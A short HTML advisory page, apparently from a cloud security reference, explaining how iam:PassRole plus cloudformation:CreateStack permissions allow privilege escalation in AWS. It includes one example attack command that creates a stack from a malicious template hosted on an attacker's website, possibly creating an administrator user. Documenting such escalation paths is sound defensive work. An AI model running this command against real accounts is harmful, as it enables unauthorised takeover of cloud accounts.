<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Passing a Role to CloudFormation</title>
</head><body><b>Description: </b>An attacker with the <u>iam:PassRole</u>&nbsp;and <u>cloudformation:CreateStack</u>&nbsp;permissions would be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating a CloudFormation stack.<br/>
&nbsp;<br/>
An example command to exploit this method might look like this:<br/>
<i>aws cloudformation create-stack –stack-name my_stack –template-url http://my-website.com/my-malicious-template.template –role-arn arn_of_cloudformation_service_role</i><br/>
&nbsp;<br/>
Where the template located at the attacker’s website includes directions to perform malicious actions, such as creating an administrator user and then using those credentials to escalate their own access.<br/>
&nbsp;<br/>
<b>Potential Impact: </b>This would give an attacker access to the privileges associated with the role that was passed when creating the CloudFormation stack, which could range from no privilege escalation to full administrator access to the account.<br/>
&nbsp; &nbsp;</body></html>